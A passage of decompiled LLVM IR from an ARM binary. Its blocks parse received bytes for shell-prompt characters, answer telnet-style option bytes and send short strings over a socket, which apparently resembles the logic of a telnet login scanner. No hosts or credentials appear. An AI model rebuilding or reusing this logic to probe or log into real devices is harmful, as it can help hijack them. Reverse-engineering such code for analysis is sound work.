  %v3_105c0 = call i32 @function_12120(i32 %v0_105b8, i32 %v2_105b8, i32 %v2_105b0)
  store i32 %v3_105c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10004

dec_label_pc_105c8:                               ; preds = %dec_label_pc_10004
  %v1_105c8 = add i32 %v0_10004, 24
  %v2_105c8 = inttoptr i32 %v1_105c8 to i32*
  %v3_105c8 = load i32, i32* %v2_105c8, align 4
  store i32 %v3_105c8, i32* %ip.global-to-local, align 4
  %v1_105cc = add i32 %v3_105c8, -1
  store i32 %v1_105cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105d0 = icmp eq i32 %v1_105cc, 0
  store i1 %v2_105d0, i1* %cpsr_z.global-to-local, align 1
  %v5_105d4 = icmp sgt i32 %v1_105cc, 0
  br i1 %v5_105d4, label %dec_label_pc_105fc, label %dec_label_pc_ff84.backedge.thread

dec_label_pc_105dc:                               ; preds = %bb383
  %v2_105dc = icmp ugt i8 %v3_10600, 35
  store i1 %v2_105dc, i1* %cpsr_c.global-to-local, align 1
  %v7_105dc = icmp eq i8 %v3_10600, 36
  store i1 %v7_105dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105dc, label %dec_label_pc_10610, label %dec_label_pc_105e4

dec_label_pc_105e4:                               ; preds = %dec_label_pc_105dc
  %v2_105e4 = icmp ugt i8 %v3_10600, 34
  store i1 %v2_105e4, i1* %cpsr_c.global-to-local, align 1
  %v7_105e4 = icmp eq i8 %v3_10600, 35
  store i1 %v7_105e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105e4, label %dec_label_pc_10610, label %dec_label_pc_105ec

dec_label_pc_105ec:                               ; preds = %dec_label_pc_105e4
  %v2_105ec = icmp ugt i8 %v3_10600, 36
  store i1 %v2_105ec, i1* %cpsr_c.global-to-local, align 1
  %v7_105ec = icmp eq i8 %v3_10600, 37
  store i1 %v7_105ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105ec, label %dec_label_pc_10610, label %dec_label_pc_105f4

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105ec
  %v1_105f4 = add i32 %v0_10610, -1
  store i32 %v1_105f4, i32* %r0.global-to-local, align 4
  %v2_105f4 = icmp ne i32 %v0_10610, 0
  store i1 %v2_105f4, i1* %cpsr_c.global-to-local, align 1
  %v7_105f4 = icmp eq i32 %v0_10610, 1
  store i1 %v7_105f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105f4, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_105fc

dec_label_pc_105fc:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_105f4
  %v0_10610 = phi i32 [ %v1_105f4, %dec_label_pc_105f4 ], [ %v1_105cc, %dec_label_pc_105c8 ]
  %v2_105fc = add i32 %v0_10610, %v0_10004
  store i32 %v2_105fc, i32* %r3.global-to-local, align 4
  %v1_10600 = add i32 %v2_105fc, 28
  %v2_10600 = inttoptr i32 %v1_10600 to i8*
  %v3_10600 = load i8, i8* %v2_10600, align 1
  %v4_10600 = zext i8 %v3_10600 to i32
  store i32 %v4_10600, i32* %r3.global-to-local, align 4
  %v2_10604 = icmp ugt i8 %v3_10600, 61
  store i1 %v2_10604, i1* %cpsr_c.global-to-local, align 1
  %v7_10604 = icmp eq i8 %v3_10600, 62
  store i1 %v7_10604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10604, label %dec_label_pc_10610, label %bb383

bb383:                                            ; preds = %dec_label_pc_105fc
  %v3_10608 = icmp ugt i8 %v3_10600, 57
  store i1 %v3_10608, i1* %cpsr_c.global-to-local, align 1
  %v8_10608 = icmp eq i8 %v3_10600, 58
  store i1 %v8_10608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10608, label %dec_label_pc_10610, label %dec_label_pc_105dc

dec_label_pc_10610:                               ; preds = %dec_label_pc_105fc, %bb383, %dec_label_pc_105ec, %dec_label_pc_105e4, %dec_label_pc_105dc
  %v1_10610 = add i32 %v0_10610, 1
  store i32 %v1_10610, i32* @r7, align 4
  %v2_10614 = icmp eq i32 %v1_10610, -1
  store i1 %v2_10614, i1* %cpsr_c.global-to-local, align 1
  %v7_10614 = icmp eq i32 %v0_10610, -2
  store i1 %v7_10614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10614, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %dec_label_pc_10610
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1061c = icmp eq i32 %v1_10610, 0
  store i1 %v2_1061c, i1* %cpsr_z.global-to-local, align 1
  %tmp384 = icmp slt i32 %v1_10610, 1
  br i1 %tmp384, label %dec_label_pc_10114, label %dec_label_pc_10624

dec_label_pc_10624:                               ; preds = %dec_label_pc_1061c
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10628 = call i32 @function_10c20(i32 7)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_10638 = call i32 @function_10b3c(i32 7, i32* nonnull %stack_var_-56)
  store i32 %v3_10638, i32* %r0.global-to-local, align 4
  %v3_1063c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1063c, i32* %r2.global-to-local, align 4
  store i32 %v3_10638, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10648 = load i32, i32* @r6, align 4
  %v1_10648 = add i32 %v0_10648, 4
  %v2_10648 = inttoptr i32 %v1_10648 to i32*
  %v3_10648 = load i32, i32* %v2_10648, align 4
  store i32 %v3_10648, i32* %r0.global-to-local, align 4
  %v4_1064c = inttoptr i32 %v3_10638 to i32*
  %v5_1064c = call i32 @function_12350(i32 %v3_10648, i32* %v4_1064c, i32 %v3_1063c, i32 16384)
  store i32 %v5_1064c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1065c = load i32, i32* @r6, align 4
  %v1_1065c = add i32 %v0_1065c, 4
  %v2_1065c = inttoptr i32 %v1_1065c to i32*
  %v3_1065c = load i32, i32* %v2_1065c, align 4
  store i32 %v3_1065c, i32* %r0.global-to-local, align 4
  %v5_10660 = call i32 @function_12350(i32 %v3_1065c, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10668 = call i32 @function_10b68(i32 7)
  store i32 %v1_10668, i32* %r0.global-to-local, align 4
  %v0_1066c = load i32, i32* @r6, align 4
  %v1_1066c = add i32 %v0_1066c, 24
  %v2_1066c = inttoptr i32 %v1_1066c to i32*
  %v3_1066c = load i32, i32* %v2_1066c, align 4
  store i32 %v3_1066c, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_10674 = add i32 %v0_1066c, 12
  %v3_10674 = inttoptr i32 %v2_10674 to i32*
  store i32 9, i32* %v3_10674, align 4
  br label %dec_label_pc_105a4

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10004
  %v1_1067c = add i32 %v0_10004, 24
  %v2_1067c = inttoptr i32 %v1_1067c to i32*
  %v3_1067c = load i32, i32* %v2_1067c, align 4
  store i32 %v3_1067c, i32* %ip.global-to-local, align 4
  %v1_10680 = add i32 %v3_1067c, -1
  store i32 %v1_10680, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10684 = icmp eq i32 %v1_10680, 0
  store i1 %v2_10684, i1* %cpsr_z.global-to-local, align 1
  %v5_10688 = icmp sgt i32 %v1_10680, 0
  br i1 %v5_10688, label %dec_label_pc_106b0, label %dec_label_pc_ff84.backedge.thread

dec_label_pc_10690:                               ; preds = %bb385
  %v2_10690 = icmp ugt i8 %v3_106b4, 35
  store i1 %v2_10690, i1* %cpsr_c.global-to-local, align 1
  %v7_10690 = icmp eq i8 %v3_106b4, 36
  store i1 %v7_10690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10690, label %dec_label_pc_106c4, label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10690
  %v2_10698 = icmp ugt i8 %v3_106b4, 34
  store i1 %v2_10698, i1* %cpsr_c.global-to-local, align 1
  %v7_10698 = icmp eq i8 %v3_106b4, 35
  store i1 %v7_10698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10698, label %dec_label_pc_106c4, label %dec_label_pc_106a0

dec_label_pc_106a0:                               ; preds = %dec_label_pc_10698
  %v2_106a0 = icmp ugt i8 %v3_106b4, 36
  store i1 %v2_106a0, i1* %cpsr_c.global-to-local, align 1
  %v7_106a0 = icmp eq i8 %v3_106b4, 37
  store i1 %v7_106a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106a0, label %dec_label_pc_106c4, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_106a0
  %v1_106a8 = add i32 %v0_106c4, -1
  store i32 %v1_106a8, i32* %r0.global-to-local, align 4
  %v2_106a8 = icmp ne i32 %v0_106c4, 0
  store i1 %v2_106a8, i1* %cpsr_c.global-to-local, align 1
  %v7_106a8 = icmp eq i32 %v0_106c4, 1
  store i1 %v7_106a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106a8, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_106a8
  %v0_106c4 = phi i32 [ %v1_106a8, %dec_label_pc_106a8 ], [ %v1_10680, %dec_label_pc_1067c ]
  %v2_106b0 = add i32 %v0_106c4, %v0_10004
  store i32 %v2_106b0, i32* %r3.global-to-local, align 4
  %v1_106b4 = add i32 %v2_106b0, 28
  %v2_106b4 = inttoptr i32 %v1_106b4 to i8*
  %v3_106b4 = load i8, i8* %v2_106b4, align 1
  %v4_106b4 = zext i8 %v3_106b4 to i32
  store i32 %v4_106b4, i32* %r3.global-to-local, align 4
  %v2_106b8 = icmp ugt i8 %v3_106b4, 61
  store i1 %v2_106b8, i1* %cpsr_c.global-to-local, align 1
  %v7_106b8 = icmp eq i8 %v3_106b4, 62
  store i1 %v7_106b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106b8, label %dec_label_pc_106c4, label %bb385

bb385:                                            ; preds = %dec_label_pc_106b0
  %v3_106bc = icmp ugt i8 %v3_106b4, 57
  store i1 %v3_106bc, i1* %cpsr_c.global-to-local, align 1
  %v8_106bc = icmp eq i8 %v3_106b4, 58
  store i1 %v8_106bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106bc, label %dec_label_pc_106c4, label %dec_label_pc_10690

dec_label_pc_106c4:                               ; preds = %dec_label_pc_106b0, %bb385, %dec_label_pc_106a0, %dec_label_pc_10698, %dec_label_pc_10690
  %v1_106c4 = add i32 %v0_106c4, 1
  store i32 %v1_106c4, i32* @r7, align 4
  %v2_106c8 = icmp eq i32 %v1_106c4, -1
  store i1 %v2_106c8, i1* %cpsr_c.global-to-local, align 1
  %v7_106c8 = icmp eq i32 %v0_106c4, -2
  store i1 %v7_106c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106c8, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_106d0

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106d0 = icmp eq i32 %v1_106c4, 0
  store i1 %v2_106d0, i1* %cpsr_z.global-to-local, align 1
  %tmp386 = icmp slt i32 %v1_106c4, 1
  br i1 %tmp386, label %dec_label_pc_10114, label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_106d0
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_106dc = call i32 @function_10c20(i32 8)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_106ec = call i32 @function_10b3c(i32 8, i32* nonnull %stack_var_-56)
  store i32 %v3_106ec, i32* %r0.global-to-local, align 4
  %v3_106f0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_106f0, i32* %r2.global-to-local, align 4
  store i32 %v3_106ec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_106fc = load i32, i32* @r6, align 4
  %v1_106fc = add i32 %v0_106fc, 4
  %v2_106fc = inttoptr i32 %v1_106fc to i32*
  %v3_106fc = load i32, i32* %v2_106fc, align 4
  store i32 %v3_106fc, i32* %r0.global-to-local, align 4
  %v4_10700 = inttoptr i32 %v3_106ec to i32*
  %v5_10700 = call i32 @function_12350(i32 %v3_106fc, i32* %v4_10700, i32 %v3_106f0, i32 16384)
  store i32 %v5_10700, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10710 = load i32, i32* @r6, align 4
  %v1_10710 = add i32 %v0_10710, 4
  %v2_10710 = inttoptr i32 %v1_10710 to i32*
  %v3_10710 = load i32, i32* %v2_10710, align 4
  store i32 %v3_10710, i32* %r0.global-to-local, align 4
  %v5_10714 = call i32 @function_12350(i32 %v3_10710, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1071c = call i32 @function_10b68(i32 8)
  store i32 %v1_1071c, i32* %r0.global-to-local, align 4
  %v0_10720 = load i32, i32* @r6, align 4
  %v1_10720 = add i32 %v0_10720, 24
  %v2_10720 = inttoptr i32 %v1_10720 to i32*
  %v3_10720 = load i32, i32* %v2_10720, align 4
  store i32 %v3_10720, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_10728 = add i32 %v0_10720, 12
  %v3_10728 = inttoptr i32 %v2_10728 to i32*
  store i32 10, i32* %v3_10728, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10730:                               ; preds = %dec_label_pc_10004
  %v1_10730 = add i32 %v0_10004, 24
  %v2_10730 = inttoptr i32 %v1_10730 to i32*
  %v3_10730 = load i32, i32* %v2_10730, align 4
  store i32 %v3_10730, i32* %ip.global-to-local, align 4
  %v1_10734 = add i32 %v3_10730, -1
  store i32 %v1_10734, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10738 = icmp eq i32 %v1_10734, 0
  store i1 %v2_10738, i1* %cpsr_z.global-to-local, align 1
  %v5_1073c = icmp sgt i32 %v1_10734, 0
  br i1 %v5_1073c, label %dec_label_pc_10764, label %dec_label_pc_ff84.backedge.thread

dec_label_pc_10744:                               ; preds = %bb387
  %v2_10744 = icmp ugt i8 %v3_10768, 35
  store i1 %v2_10744, i1* %cpsr_c.global-to-local, align 1
  %v7_10744 = icmp eq i8 %v3_10768, 36
  store i1 %v7_10744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10744, label %dec_label_pc_10778, label %dec_label_pc_1074c

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10744
  %v2_1074c = icmp ugt i8 %v3_10768, 34
  store i1 %v2_1074c, i1* %cpsr_c.global-to-local, align 1
  %v7_1074c = icmp eq i8 %v3_10768, 35
  store i1 %v7_1074c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1074c, label %dec_label_pc_10778, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %dec_label_pc_1074c
  %v2_10754 = icmp ugt i8 %v3_10768, 36
  store i1 %v2_10754, i1* %cpsr_c.global-to-local, align 1
  %v7_10754 = icmp eq i8 %v3_10768, 37
  store i1 %v7_10754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10754, label %dec_label_pc_10778, label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10754
  %v1_1075c = add i32 %v0_10778, -1
  store i32 %v1_1075c, i32* %r0.global-to-local, align 4
  %v2_1075c = icmp ne i32 %v0_10778, 0
  store i1 %v2_1075c, i1* %cpsr_c.global-to-local, align 1
  %v7_1075c = icmp eq i32 %v0_10778, 1
  store i1 %v7_1075c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1075c, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %dec_label_pc_10730, %dec_label_pc_1075c
  %v0_10778 = phi i32 [ %v1_1075c, %dec_label_pc_1075c ], [ %v1_10734, %dec_label_pc_10730 ]
  %v2_10764 = add i32 %v0_10778, %v0_10004
  store i32 %v2_10764, i32* %r3.global-to-local, align 4
  %v1_10768 = add i32 %v2_10764, 28
  %v2_10768 = inttoptr i32 %v1_10768 to i8*
  %v3_10768 = load i8, i8* %v2_10768, align 1
  %v4_10768 = zext i8 %v3_10768 to i32
  store i32 %v4_10768, i32* %r3.global-to-local, align 4
  %v2_1076c = icmp ugt i8 %v3_10768, 61
  store i1 %v2_1076c, i1* %cpsr_c.global-to-local, align 1
  %v7_1076c = icmp eq i8 %v3_10768, 62
  store i1 %v7_1076c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1076c, label %dec_label_pc_10778, label %bb387

bb387:                                            ; preds = %dec_label_pc_10764
  %v3_10770 = icmp ugt i8 %v3_10768, 57
  store i1 %v3_10770, i1* %cpsr_c.global-to-local, align 1
  %v8_10770 = icmp eq i8 %v3_10768, 58
  store i1 %v8_10770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10770, label %dec_label_pc_10778, label %dec_label_pc_10744

dec_label_pc_10778:                               ; preds = %dec_label_pc_10764, %bb387, %dec_label_pc_10754, %dec_label_pc_1074c, %dec_label_pc_10744
  %v1_10778 = add i32 %v0_10778, 1
  store i32 %v1_10778, i32* @r7, align 4
  %v2_1077c = icmp eq i32 %v1_10778, -1
  store i1 %v2_1077c, i1* %cpsr_c.global-to-local, align 1
  %v7_1077c = icmp eq i32 %v0_10778, -2
  store i1 %v7_1077c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1077c, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_10784

dec_label_pc_10784:                               ; preds = %dec_label_pc_10778
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10784 = icmp eq i32 %v1_10778, 0
  store i1 %v2_10784, i1* %cpsr_z.global-to-local, align 1
  %tmp388 = icmp slt i32 %v1_10778, 1
  br i1 %tmp388, label %dec_label_pc_10114, label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10784
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10790 = call i32 @function_10c20(i32 4)
  store i32 %v2_103f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_107a0 = call i32 @function_10b3c(i32 4, i32* nonnull %stack_var_-48)
  store i32 %v3_107a0, i32* %r0.global-to-local, align 4
  %v3_107a4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_107a4, i32* %r2.global-to-local, align 4
  store i32 %v3_107a0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_107b0 = load i32, i32* @r6, align 4
  %v1_107b0 = add i32 %v0_107b0, 4
  %v2_107b0 = inttoptr i32 %v1_107b0 to i32*
  %v3_107b0 = load i32, i32* %v2_107b0, align 4
  store i32 %v3_107b0, i32* %r0.global-to-local, align 4
  %v4_107b4 = inttoptr i32 %v3_107a0 to i32*
  %v5_107b4 = call i32 @function_12350(i32 %v3_107b0, i32* %v4_107b4, i32 %v3_107a4, i32 16384)
  store i32 %v5_107b4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_107c4 = load i32, i32* @r6, align 4
  %v1_107c4 = add i32 %v0_107c4, 4
  %v2_107c4 = inttoptr i32 %v1_107c4 to i32*
  %v3_107c4 = load i32, i32* %v2_107c4, align 4
  store i32 %v3_107c4, i32* %r0.global-to-local, align 4
  %v5_107c8 = call i32 @function_12350(i32 %v3_107c4, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_107d0 = call i32 @function_10b68(i32 4)
  store i32 %v1_107d0, i32* %r0.global-to-local, align 4
  %v0_107d4 = load i32, i32* @r6, align 4
  %v1_107d4 = add i32 %v0_107d4, 24
  %v2_107d4 = inttoptr i32 %v1_107d4 to i32*
  %v3_107d4 = load i32, i32* %v2_107d4, align 4
  store i32 %v3_107d4, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_107dc = add i32 %v0_107d4, 12
  %v3_107dc = inttoptr i32 %v2_107dc to i32*
  store i32 8, i32* %v3_107dc, align 4
  br label %dec_label_pc_105a4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_10094
  store i32 ptrtoint (i32* @global_var_1442e.209 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_1004c, i32* @r0, align 4
  %v3_107f0 = call i32 @function_12110(i32 %v2_1004c, i32 ptrtoint (i32* @global_var_1442e.209 to i32), i32 3)
  store i32 9, i32* @r2, align 4
  store i32 %v2_107fc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_14425.211 to i32), i32* @r1, align 4
  %v3_10804 = call i32 @function_12110(i32 %v2_107fc, i32 ptrtoint (i32* @global_var_14425.211 to i32), i32 9)
  store i32 %v3_10804, i32* %r0.global-to-local, align 4
  %v0_10808 = load i32, i32* @r6, align 4
  %v1_10808 = add i32 %v0_10808, 24
  %v2_10808 = inttoptr i32 %v1_10808 to i32*
  %v3_10808 = load i32, i32* %v2_10808, align 4
  store i32 %v3_10808, i32* %ip.global-to-local, align 4
  %v0_1080c = load i32, i32* @r5, align 4
  %v1_1080c = add i32 %v0_1080c, 2
  store i32 %v1_1080c, i32* %r2.global-to-local, align 4
  %v0_10810 = load i32, i32* @sb, align 4
  %v2_10810 = add i32 %v0_10810, %v3_10808
  store i32 %v2_10810, i32* %r3.global-to-local, align 4
  %v3_10814 = icmp uge i32 %v2_10810, %v1_1080c
  store i1 %v3_10814, i1* %cpsr_c.global-to-local, align 1
  %v9_10814 = icmp eq i32 %v2_10810, %v1_1080c
  store i1 %v9_10814, i1* %cpsr_z.global-to-local, align 1
  %v2_10818 = xor i1 %v3_10814, true
  %v3_10818 = or i1 %v9_10814, %v2_10818
  br i1 %v3_10818, label %dec_label_pc_107e4.dec_label_pc_10104.loopexit_crit_edge, label %dec_label_pc_1081c

dec_label_pc_107e4.dec_label_pc_10104.loopexit_crit_edge: ; preds = %dec_label_pc_107e4
  %v0_10104.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10104

dec_label_pc_1081c:                               ; preds = %dec_label_pc_107e4
  %v0_1081c = load i32, i32* @r4, align 4
  %v1_1081c = add i32 %v0_1081c, 1
  %v2_1081c = inttoptr i32 %v1_1081c to i8*
  %v3_1081c = load i8, i8* %v2_1081c, align 1
  %v4_1081c = zext i8 %v3_1081c to i32
  store i32 %v4_1081c, i32* %r3.global-to-local, align 4
  %v2_10820 = icmp ugt i8 %v3_1081c, 30
  store i1 %v2_10820, i1* %cpsr_c.global-to-local, align 1
  %v7_10820 = icmp eq i8 %v3_1081c, 31
  store i1 %v7_10820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10820, label %dec_label_pc_10940, label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %dec_label_pc_1081c
  %v1_10828 = add i32 %v0_1081c, -1
  %v2_10828 = inttoptr i32 %v1_10828 to i8*
  %v3_10828 = load i8, i8* %v2_10828, align 1
  %v4_10828 = zext i8 %v3_10828 to i32
  store i32 %v4_10828, i32* %r3.global-to-local, align 4
  %v2_1082c = icmp ugt i8 %v3_10828, -4
  store i1 %v2_1082c, i1* %cpsr_c.global-to-local, align 1
  %v7_1082c = icmp eq i8 %v3_10828, -3
  store i1 %v7_1082c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1082c, label %bb389, label %dec_label_pc_10838

bb389:                                            ; preds = %dec_label_pc_10828
  %v1_10830 = load i32, i32* @r8, align 4
  %v2_10830 = trunc i32 %v1_10830 to i8
  store i8 %v2_10830, i8* %v2_10828, align 1
  %v0_10834.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10834.pr, label %dec_label_pc_100a8, label %.dec_label_pc_10838_crit_edge

.dec_label_pc_10838_crit_edge:                    ; preds = %bb389
  %v0_10838.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %.dec_label_pc_10838_crit_edge, %dec_label_pc_10828
  %v0_10838 = phi i32 [ %v0_10838.pre, %.dec_label_pc_10838_crit_edge ], [ %v4_10828, %dec_label_pc_10828 ]
  %v2_10838 = icmp ugt i32 %v0_10838, 250
  store i1 %v2_10838, i1* %cpsr_c.global-to-local, align 1
  %v7_10838 = icmp eq i32 %v0_10838, 251
  store i1 %v7_10838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10838, label %bb390, label %dec_label_pc_100a8

bb390:                                            ; preds = %dec_label_pc_10838
  %v1_1083c = load i32, i32* %sl.global-to-local, align 4
  %v2_1083c = trunc i32 %v1_1083c to i8
  %v3_1083c = load i32, i32* @r4, align 4
  %v4_1083c = add i32 %v3_1083c, -1
  %v5_1083c = inttoptr i32 %v4_1083c to i8*
  store i8 %v2_1083c, i8* %v5_1083c, align 1
  br label %dec_label_pc_100a8

dec_label_pc_10844:                               ; preds = %dec_label_pc_101f0, %dec_label_pc_101cc, %dec_label_pc_1020c
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10848 = call i32 @function_10c20(i32 25)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_10858 = call i32 @function_10b3c(i32 25, i32* nonnull %stack_var_-56)
  %v3_1085c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10858, i32* %r2.global-to-local, align 4
  %v1_10864 = add i32 %v3_1085c, -1
  store i32 %v1_10864, i32* %r3.global-to-local, align 4
  %v0_10868 = load i32, i32* @sb, align 4
  store i32 %v0_10868, i32* %r0.global-to-local, align 4
  %v0_1086c = load i32, i32* @r6, align 4
  %v1_1086c = add i32 %v0_1086c, 24
  %v2_1086c = inttoptr i32 %v1_1086c to i32*
  %v3_1086c = load i32, i32* %v2_1086c, align 4
  store i32 %v3_1086c, i32* %r1.global-to-local, align 4
  %v4_10870 = call i32 @function_112b0(i32 %v0_10868, i32 %v3_1086c, i32 %v3_10858, i32 %v1_10864)
  store i32 %v4_10870, i32* %r0.global-to-local, align 4
  %v1_10874 = add i32 %v4_10870, 1
  store i32 %v1_10874, i32* @r7, align 4
  %v2_10874 = icmp eq i32 %v4_10870, -1
  store i1 %v2_10874, i1* %cpsr_c.global-to-local, align 1
  %v7_10874 = icmp eq i32 %v1_10874, 0
  store i1 %v7_10874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10874, label %thread-pre-split96, label %bb391

bb391:                                            ; preds = %dec_label_pc_10844
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split96

thread-pre-split96:                               ; preds = %dec_label_pc_10844, %bb391
  %v0_1087c = phi i1 [ false, %bb391 ], [ true, %dec_label_pc_10844 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_1087c, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_109bc = call i32 @function_10b68(i32 25)
  store i32 %v1_109bc, i32* %r0.global-to-local, align 4
  br i1 %v0_1087c, label %dec_label_pc_109b8, label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %thread-pre-split96
  %v0_1088c = load i32, i32* @r7, align 4
  %v3_1088c = icmp eq i32 %v0_1088c, -1
  store i1 %v3_1088c, i1* %cpsr_c.global-to-local, align 1
  %v8_1088c = icmp eq i32 %v0_1088c, -1
  store i1 %v8_1088c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1088c, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_10220

dec_label_pc_10898:                               ; preds = %dec_label_pc_10444
  store i32 %v1_10480, i32* %r0.global-to-local, align 4
  %v0_108a0 = load i32, i32* @r6, align 4
  %v1_108a0 = add i32 %v0_108a0, 4
  %v2_108a0 = inttoptr i32 %v1_108a0 to i32*
  %v3_108a0 = load i32, i32* %v2_108a0, align 4
  store i32 %v3_108a0, i32* %r0.global-to-local, align 4
  %v1_108a4 = call i32 @function_11af0(i32 %v3_108a0)
  store i32 %v1_108a4, i32* %r0.global-to-local, align 4
  %v0_108a8 = load i32, i32* @r6, align 4
  %v1_108a8 = add i32 %v0_108a8, 284
  %v2_108a8 = inttoptr i32 %v1_108a8 to i8*
  %v3_108a8 = load i8, i8* %v2_108a8, align 1
  %v4_108a8 = zext i8 %v3_108a8 to i32
  %v1_108ac = add nuw nsw i32 %v4_108a8, 1
  %v1_108b0 = urem i32 %v1_108ac, 256
  store i32 %v1_108b0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_108b8 = icmp ugt i32 %v1_108b0, 9
  store i1 %v2_108b8, i1* %cpsr_c.global-to-local, align 1
  %v7_108b8 = icmp eq i32 %v1_108b0, 10
